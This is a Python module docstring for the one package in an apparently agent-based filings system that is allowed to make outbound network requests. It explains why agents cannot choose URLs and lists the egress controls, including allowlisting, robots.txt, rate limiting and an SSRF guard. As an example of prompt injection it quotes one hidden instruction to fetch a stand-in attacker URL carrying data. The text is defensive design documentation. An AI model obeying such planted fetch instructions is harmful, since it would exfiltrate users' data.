"""The only component permitted to make outbound network requests.

Nothing else in this codebase opens a socket to the internet. That is a rule in
``CLAUDE.md``, and this package is what makes it enforceable: one door, with every control
on it.

**No agent can reach this layer with a URL it chose.** There is no agent-callable tool
anywhere in this system that takes an arbitrary URL. Agents ask for a *kind* of source —
"the latest 10-K for this company" — and deterministic adapter code decides which URL that
means. That is the structural defence against prompt injection escalating to exfiltration:
text hidden in a filing can say "fetch https://evil.test/?data=..." as loudly as it likes,
because no tool exists that would carry out the instruction. See threat model T3 in
``docs/archive/PLAN.md`` and ``docs/adr/0009-network-egress-is-deterministic-and-guarded.md``.

The controls, in the order a request passes through them:

1. **Policy** — is this host on the allowlist for this provider at all?
2. **robots.txt** — does the publisher permit this path for our user agent? A disallow is
   a refusal, not a warning.
3. **Rate limit** — a token bucket in Redis, shared by every worker, so politeness holds
   across processes rather than per process.
4. **Circuit breaker** — after repeated failures, stop asking for a while.
5. **SSRF guard** — resolve the hostname, validate every address it returns, and connect
   only to a validated one. Re-checked on every redirect hop.
6. **Streaming cap** — abandon the body the moment it exceeds the limit.
7. **Archive** — every response is stored as a hashed artefact, including failures.
"""

from __future__ import annotations
